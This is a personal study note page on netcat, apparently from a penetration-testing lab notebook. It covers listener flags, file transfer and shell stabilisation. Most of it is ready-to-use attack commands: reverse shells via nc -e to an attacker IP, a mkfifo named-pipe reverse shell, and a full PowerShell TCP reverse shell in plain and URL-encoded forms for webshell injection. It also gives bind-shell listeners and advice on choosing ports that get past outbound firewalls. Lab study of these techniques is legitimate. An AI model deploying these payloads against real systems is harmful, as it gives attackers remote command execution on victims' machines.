---
{"dg-publish":true,"permalink":"/notes/netcat/"}
---

- "Swiss Army Knife" of networking.
- Perform all kinds of network interactions.
- Support [[Networking/TCP\|TCP]] and [[UDP\|UDP]]
- Used to receive reverse shells and connect to remote ports attached to bind shells on a target system.
- If you choose to use a **port below 1024**, you will need to use `sudo` when starting your listener.
- It's **good idea** to **use** a **well-known** port number (**80, 443 or 53** being good choices) as this is more likely to get **past** outbound **firewall rules** on the target.

| Command   | Description                                                                        |
| --------- | ---------------------------------------------------------------------------------- |
| `-l`      | is used to tell netcat that this will be a listener                                |
| `-n`      | tells netcat not to resolve host names or use DNS. avoid DNS lookups and warnings. |
| `-v`      | is used to request a verbose output                                                |
| `-p`      | indicates that the port specification will follow.                                 |
| `-vv`     | Very Verbose (optional)                                                            |
| `-k`      | Keep listening after client disconnects                                            |
| `-w SECS` | Timeout for connects and final net reads                                           |
# Transfer files
1. On the destination machine
```shell
nc -lp 1234 > file.txt
```
2. On the source machine
```shell
nc -w 3 IP_destination 1234 < file.txt
```

# Shell stabilization
## Technique 1: Python
1. Uses Python to spawn a better featured bash shell;
```sh
python3 -c 'import pty;pty.spawn("/bin/bash")'
```
some targets may need replace `python` with `python2` or `python3`
2. access to term commands such as `clear`.
```sh
export TERM=xterm
```
3. Background the shell using Ctrl + Z.
```sh
stty raw -echo; fg
```
This does two things: 
- First, it **turns off our own terminal echo** (which gives us access to tab autocompletes, the arrow keys, and Ctrl + C to kill processes).
- then **foregrounds the shell,** thus completing the process.
- Note that **if the shell dies,** any input in your own terminal will **not be visible** (as a result of having disabled terminal echo). To **fix this, type** `reset` and press enter.
## Technique 2: rlwrap
- Rlwrap is a program which, in simple terms, gives us **access to history**, **tab autocompletion** and the **arrow keys** immediately upon receiving a shell
``` sh
rlwrap nc -lnvp <port>
```
- particularly useful when dealing with Windows shells
- On Linux target, it's possible to completely stabilise,
- using Ctrl + Z.
```sh
stty raw -echo; fg
```
## Technique 3: [[socat\|Socat]]
## Technique 4: [[Notes/SSH\|SSH]]

## Extra 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- On my machine to get info from stty
```sh
stty -a
```
- Next, in your reverse/bind shell, type in:
`stty rows <number>`  
and
`stty cols <number>`


</div></div>


# Reverse shell
## On the target
### nc basic bash
#### Linux
```sh
nc <LOCAL-IP> <PORT> -e /bin/bash
```
**On Windows** this technique will **work perfectly**, where a static binary is nearly always required
#### Windows
**Command Prompt**
```sh
nc 10.10.38.232 443 -e “cmd.exe”
```
powershell
```sh
nc 10.10.38.232 443 -e “powershell.exe”
> ```

this is **not included in most versions of netcat** as it is widely seen to be very insecure **so**:
### Create a [[named pipe\|named pipe]]
```sh
mkfifo /tmp/f; nc <LOCAL-IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
```
### Powershell reverse shell
It can then be copied into a cmd.exe shell (or another method of executing commands on a Windows server, such as a **webshell**)
```sh
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('**<ip>**',**<port>**);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

```sh
powershell+-c+"$client+%3d+New-Object+System.Net.Sockets.TCPClient('10.13.41.201',4747)%3b$stream+%3d+$client.GetStream()%3b[byte[]]$bytes+%3d+0..65535|%25{0}%3bwhile(($i+%3d+$stream.Read($bytes,+0,+$bytes.Length))+-ne+0){%3b$data+%3d+(New-Object+-TypeName+System.Text.ASCIIEncoding).GetString($bytes,0,+$i)%3b$sendback+%3d+(iex+$data+2>%261+|+Out-String+)%3b$sendback2+%3d+$sendback+%2b+'PS+'+%2b+(pwd).Path+%2b+'>+'%3b$sendbyte+%3d+([text.encoding]%3a%3aASCII).GetBytes($sendback2)%3b$stream.Write($sendbyte,0,$sendbyte.Length)%3b$stream.Flush()}%3b$client.Close()"
```

```sh
powershell%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%27<IP>%27%2C<PORT>%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5
```
## On the attacker
65535 total number of ports
To open tcp/udp in a host, assosiate a shell to a port, force UDP/TCP conexions
port 30000
```bash
nc localhost 4747
```

ncat has more options like encrypt with ssl
``` bash
ncat --ssl 127.0.0.1 30001
```
### Listener revershell
Start a listener using rlwrap to try to simulate an interactive console
``` sh
rlwrap nc -lnvp 4747
```
# Bind shell
## On the target(listener)
```bash
nc -lnvp <port> -e /bin/bash
```

On Linux, however, we would instead use this code to create a listener for a bind shell:
[[named pipe\|named pipe]]
```sh
mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
```

Or get a cmd on windows
```sh
nc -lvnp <port> -e "cmd.exe"
```
## On the attacker
```bash
nc <target-ip> <chosen-port>
```
